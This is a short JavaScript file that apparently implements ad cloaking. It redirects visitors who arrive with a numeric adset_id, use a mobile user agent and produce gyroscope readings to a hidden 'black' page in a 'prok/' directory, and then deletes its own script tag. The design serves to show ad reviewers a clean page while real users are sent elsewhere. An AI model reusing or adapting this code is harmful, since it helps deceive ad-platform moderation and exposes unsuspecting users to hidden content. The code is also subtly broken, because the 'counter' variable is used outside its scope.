"use strict";

var isMobile = {
	Android: function() {
		return navigator.userAgent.match(/Android/i);
	},
	BlackBerry: function() {
		return navigator.userAgent.match(/BlackBerry/i);
	},
	iOS: function() {
		return navigator.userAgent.match(/iPhone|iPad|iPod/i);
	},
	Opera: function() {
		return navigator.userAgent.match(/Opera Mini/i);
	},
	Windows: function() {
		return navigator.userAgent.match(/IEMobile/i);
	},
	any: function() {
		return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.Windows());
	}
};


$(function(){
	var counter = 0;
	window.addEventListener('deviceorientation', onOrientationChange);

	var pathname = document.location.search;
	var adsetId = pathname.replace(/.*adset_id=(.*)&?.*/, "$1");
	var clearAdsetId = adsetId.replace(/[^\d]+/, "");

	if(adsetId.length != pathname.length && adsetId.length == clearAdsetId.length && isMobile.any()){
		document.location.href = makeBlackUrl();
	}

	$("#remove_script").remove();
});


function onOrientationChange(e) {
	var alpha = Math.round(e.alpha);
	var beta = Math.round(e.beta);
	var gamma = Math.round(e.gamma);

	showMessage("begin load system: giroscop");

	if((alpha || beta || gamma) && counter < 1){
		counter++;

		showMessage("end load system: giroscop");

		if(isMobile.any()){
			document.location.href = makeBlackUrl();
		} // if
	} // if
} // onOrientationChange

function showMessage(text){
	// console.log(text);
	// alert(text);
} // showMessage

function makeBlackUrl(){
	var origin = document.location.origin;
	var pathname = document.location.pathname;
	var search = document.location.search;
	var directory = "prok/";

	return origin + pathname + directory + search;
} // makeBlackUrl
